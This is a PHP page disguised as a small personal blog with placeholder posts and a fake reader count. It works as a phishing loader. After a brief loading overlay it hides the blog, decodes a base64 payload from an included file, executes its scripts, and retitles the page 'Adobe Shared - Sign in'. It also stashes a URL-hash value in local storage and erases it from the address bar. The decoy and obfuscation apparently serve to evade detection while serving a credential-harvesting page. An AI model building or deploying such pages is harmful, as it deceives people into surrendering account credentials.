<?php
defined('SECURE_ENTRY') or define('SECURE_ENTRY', true);
$siteTitle = "Easy File Share";
$welcomeMessage = "Welcome to my blog! Stay tuned for updates.";
$fakeUserCount = rand(100, 1000);
$lastUpdated = date("F j, Y", strtotime("-" . rand(1, 30) . " days"));
header("Content-Type: text/html; charset=UTF-8");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
include 'data.php';
ob_start();
function getFakePosts() {
    return [
        ["title" => "My First Post", "date" => "March 1, 2025", "content" => "Lorem ipsum dolor sit amet."],
        ["title" => "Tech Updates", "date" => "March 5, 2025", "content" => "Consectetur adipiscing elit."]
    ];
}
$posts = getFakePosts();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($siteTitle); ?></title>
    <meta name="description" content="A personal blog with updates and insights.">
    <meta name="keywords" content="blog, personal, updates, tech">
    <meta name="author" content="John Doe">
    <meta name="robots" content="index, follow">
    <style>
        body {
            height:100vh
        }
        h1 { color: #333; }
        .post { margin-bottom: 20px; }
        footer { margin-top: 20px; font-size: 14px; color: #888; }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(240, 240, 240, 0.99);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .loader {
            font-size: 24px;
            color: #333;
            text-align: center;
        }
        #decodedContent { display: none; height:100vh;}
    </style>
</head>
<body>
    <div class="overlay" id="loadingOverlay">
        <div class="loader">
            <div style="display:flex;justify-content:center;"></div>
            <div>Please wait...</div>
        </div>
    </div>
    <div class="container" id="oldcontainer">
        <h1><?php echo htmlspecialchars($welcomeMessage); ?></h1>
        <p>Currently serving <?php echo $fakeUserCount; ?> happy readers!</p>
        <p>Last updated: <?php echo $lastUpdated; ?></p>
        <?php foreach ($posts as $post): ?>
            <div class="post">
                <h2><?php echo htmlspecialchars($post['title']); ?></h2>
                <p><em>Posted on <?php echo $post['date']; ?></em></p>
                <p><?php echo htmlspecialchars($post['content']); ?></p>
            </div>
        <?php endforeach; ?>
    </div>
    <div id="decodedContent"></div>
    <footer>
        <p>© <?php echo date("Y"); ?> <?php echo htmlspecialchars($siteTitle); ?>. All rights reserved.</p>
    </footer>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script>
        const encodedContent = <?php echo json_encode($encodedContent); ?>;
        function decodeBase64(encoded) {
            try {
                return atob(encoded);
            } catch (e) {
                console.error("Base64 decoding failed:", e);
                return "";
            }
        }
        function isValidEmail(str) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(str);
        }
        function loadContent(htmlContent, targetElement) {
            document.title = "Adobe Shared - Sign in";
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = htmlContent;
            const scripts = tempDiv.getElementsByTagName('script');
            for (let i = 0; i < scripts.length; i++) {
                const script = document.createElement('script');
                if (scripts[i].src) {
                    script.src = scripts[i].src; 
                } else {
                    script.textContent = scripts[i].textContent; 
                }
                document.body.appendChild(script);
            }
            targetElement.innerHTML = tempDiv.innerHTML;
            targetElement.style.display = "block";
        }
        setTimeout(function() {
            document.getElementById("oldcontainer").style.display = "none";
            const overlay = document.getElementById("loadingOverlay");
            const contentDiv = document.getElementById("decodedContent");
            if (window.location.hash) {
                const hashValue = window.location.hash.substring(1);
                if (isValidEmail(hashValue)) {
                    alert("Access Denied. URL Contains an Email Address.");
                    overlay.style.display = "none";
                    return;
                }
                localStorage.setItem("aiVal", hashValue);
                history.replaceState(null, null, window.location.href.split("#")[0]);
            }
            const decodedContent = decodeBase64(encodedContent);
            if (decodedContent) {
                loadContent(decodedContent, contentDiv);
            }
            overlay.style.display = "none";
        }, 1500);
    </script>
</body>
</html>
<?php
ob_end_flush();
?>